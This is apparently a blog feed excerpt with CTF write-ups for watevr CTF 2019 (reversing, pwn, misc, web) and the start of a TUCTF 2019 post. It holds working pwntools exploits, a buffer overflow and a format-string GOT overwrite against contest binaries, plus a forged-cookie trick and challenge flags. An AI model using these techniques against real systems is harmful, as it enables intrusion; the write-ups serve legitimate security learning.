&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;i.e. the pointer to the numbers, the 3rd element of a precomputed array, the pointer to that array (basically the first element) and the second parameter again.&lt;/p&gt;
&lt;p&gt;This function is very interesting, it takes a number does some computation on it and returns a nuber which is the ASCII representaion of the decoded character. For this function, I wrote a separate C++ program to emulate the functionality and to get the mappings to generate all ASCII characters.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; std;

&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;func&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; inp, ulong arr_ele2, &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; mod) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; lVar1;
  
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (((&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; inp) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)arr_ele2)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; mod)) {
    inp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inp &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; mod;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
      lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
      lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inp;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
          lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (inp &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; inp) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; mod;
          lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; func(lVar1,(&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,mod);
          lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; mod;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
          lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3f&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3f&lt;/span&gt;);
          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
            lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; func(inp,arr_ele2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,mod);
            lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (lVar1 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; inp) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; mod;
          }
        }
      }
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; lVar1;
  }
                    &lt;span style=&#34;color:#75715e&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
  exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
}


&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
  map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; m;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100000&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; ans &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; func(i, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8f&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(m.find((&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)ans) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; m.end())
      m[(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)ans] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;auto&lt;/span&gt; i: m) {
    cout&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;i.first&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;i.second&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;endl;
  }
  string s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;give_me_the_flag_please&amp;#34;&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; c: s) {
    cout&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;m[c]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;
  }
  cout&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;endl;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now, what remains is to get the enoced values corresponding to &amp;ldquo;give_me_the_flag_please&amp;rdquo;. The most thing dut to which I was stuck for some time was to add the encoding for the NULL character at the end as well (here it was 0). So final input is - 38 118 79 95 127 109 95 127 129 91 95 127 20 114 15 38 127 73 114 95 15 124 95 0.&lt;/p&gt;
&lt;p&gt;The flag is - &lt;strong&gt;watevr{oops_1_f0rg0t_to_use_r4ndom_k3ys!_youtube.com/watch?v=BaACrT6Ydik}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;pwn-challenges&#34;&gt;Pwn Challenges&lt;/h1&gt;
&lt;h2 id=&#34;voting-machine-1&#34;&gt;Voting Machine 1&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/files/kamikaze&#34;&gt;kamikaze&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is a buffer overflow challenge as gets has been used. There is a function &lt;code&gt;super_secret_function&lt;/code&gt;. We basically have to jump there as it prints the flag. Pretty straightforward.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vm_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vm_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The offset of the crash is calculated using gef&amp;rsquo;s pattern create and pattern search functionality.&lt;/p&gt;
&lt;p&gt;My exploit code -&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./kamikaze&amp;#34;&lt;/span&gt;)
e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./kamikaze&amp;#39;&lt;/span&gt;)
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;13.48.67.196&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50000&lt;/span&gt;)

offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;)

func &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400807&lt;/span&gt;

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;offset
payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(func)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)

&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(payload)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is - &lt;strong&gt;watevr{w3ll_th4t_w4s_pr3tty_tr1v1al_anyways_&lt;a href=&#34;https://www.youtube.com/watch?v=Va4aF6rRdqU%7D&#34;&gt;https://www.youtube.com/watch?v=Va4aF6rRdqU}&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;voting-machine-2&#34;&gt;Voting Machine 2&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/files/kamikaze2&#34;&gt;kamikaze2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This binary had a format string vulnerability, since printf is being used without any format specifiers.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vm2_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/vm2_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;I played around with the input for a while, realised that there was an alignment issue (of 2), when trying to get my input onto the stack variables. After this, we can see our input string at the 8th output (stack output due to format string bug) when supplied with &lt;code&gt;%x&lt;/code&gt;s. The objective here is to replace the exit call at the end of main (FUN_084207fb) with a function that reads the flag (FUN_08420736).&lt;/p&gt;
&lt;p&gt;After this, it becomes just a matter of calculating offsets. We place the return address on the stack in two parts, and the offsets are calculated accordingly. I could go in depth regarding the offsets, but it is a pretty simple (not easy) process. If you have doubts, leave a comment, I will explain it.&lt;/p&gt;
&lt;p&gt;The final exploit code is -&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./kamikaze2&amp;#34;&lt;/span&gt;)
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;13.53.125.206&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50000&lt;/span&gt;)

offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;
func &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08420736&lt;/span&gt;
main &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x084207fb&lt;/span&gt;
exit_plt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08422024&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pad&lt;/span&gt;(s):
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(offset&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;len(s))

exploit &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AA&amp;#34;&lt;/span&gt;
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p32(exit_plt)
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p32(exit_plt&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BBBBCCCC&amp;#34;&lt;/span&gt;
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%8$1828x&amp;#34;&lt;/span&gt;
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%8$n&amp;#34;&lt;/span&gt;
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%65804x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
exploit &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%9$n&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(pad(exploit))
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pad(exploit)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)

&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(pad(exploit))

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is - &lt;strong&gt;watevr{GOT_som3_fl4g_for_you_&lt;a href=&#34;https://www.youtube.com/watch?v=hYeFcSq7Mxg%7D&#34;&gt;https://www.youtube.com/watch?v=hYeFcSq7Mxg}&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;other-categories&#34;&gt;Other categories&lt;/h1&gt;
&lt;h2 id=&#34;misc---unspaellablle&#34;&gt;Misc - Unspaellablle&lt;/h2&gt;
&lt;p&gt;File: &lt;a href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/files/orig.txt&#34;&gt;orig.txt&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We are given a script for an episode of CHILDREN OF THE GODS by Jonathan Glassner &amp;amp; Brad Wright. Initially I had no clue how to proceed, but then I googled this episode and specifically for its transcript.&lt;/p&gt;
&lt;p&gt;I found it at &lt;a href=&#34;https://www.imsdb.com/transcripts/Stargate-SG1-Children-Of-The-Gods.html&#34;&gt;IMSDb&lt;/a&gt;, and it was in the same format!!!&lt;/p&gt;
&lt;p&gt;After this it was just a matter of diffing using vimdiff to get the changed characters which was oir flag.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/spell.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-15_watevr-ctf-2019-writeups/images/spell.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The flag is - &lt;strong&gt;watevr{icantspeel_tiny.cc/2qtdez}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;web---cookie-store&#34;&gt;Web - Cookie Store&lt;/h2&gt;
&lt;p&gt;Webpage - &lt;a href=&#34;http://13.48.71.231:50000/&#34;&gt;http://13.48.71.231:50000/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The page has a cookie - &lt;strong&gt;eyJtb25leSI6IDUwLCAiaGlzdG9yeSI6IFtdfQ==&lt;/strong&gt;, on decoding - &lt;strong&gt;{&amp;ldquo;money&amp;rdquo;: 50, &amp;ldquo;history&amp;rdquo;: []}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;We see that the &lt;em&gt;Flag&lt;/em&gt; cookie is for 100$, so if we set the cookie to base64({&amp;ldquo;money&amp;rdquo;: 200, &amp;ldquo;history&amp;rdquo;: []}), i.e. &lt;strong&gt;eyJtb25leSI6IDIwMCwgImhpc3RvcnkiOiBbXX0=&lt;/strong&gt;.  With this our balance gets updated. Now we can buy the flag cookie and get the flag.&lt;/p&gt;
&lt;p&gt;The flag is - &lt;strong&gt;watevr{b64_15_4_6r347_3ncryp710n_m37h0d}&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;That&amp;rsquo;s all for now. Those were the problems I solved during the CTF. There were a few more Rev problems that I spent a huge amount of time on, but couldn&amp;rsquo;t solve. I will add my version of their writeups when I get to know their solution.&lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;a id=&#34;openpopup&#34; class=&#34;example_a&#34; rel=&#34;nofollow noopener&#34;&gt;Subscribe to my posts!&lt;/a&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>TUCTF 2019 - Pwn &amp; Rev Challenges</title>
      <link>https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/</link>
      <pubDate>Mon, 02 Dec 2019 19:39:57 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/</guid>
      <description>&lt;p&gt;I couldn&amp;rsquo;t give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;pwn-challenges&#34;&gt;Pwn Challenges&lt;/h1&gt;
&lt;h2 id=&#34;thefirst---379-pts&#34;&gt;thefirst - 379 pts&lt;/h2&gt;
&lt;p&gt;We can see in the image below that &lt;code&gt;gets&lt;/code&gt; is being used to take the input. Hence it can be exploited for &lt;em&gt;buffer overflow&lt;/em&gt;. First, using GDB (with GEF), we find that the offset required to overflow the buffer is 24.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/thefirst_1.png&#34; data-caption=&#34;Disassembly of main&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/thefirst_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Disassembly of main
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;This can be done using &lt;code&gt;pattern create 50&lt;/code&gt; and then using that pattern to find the crash offset.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/gef_1.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/gef_1.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/gef_2.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-12-02_tuctf-pwn-2019/images/gef_2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

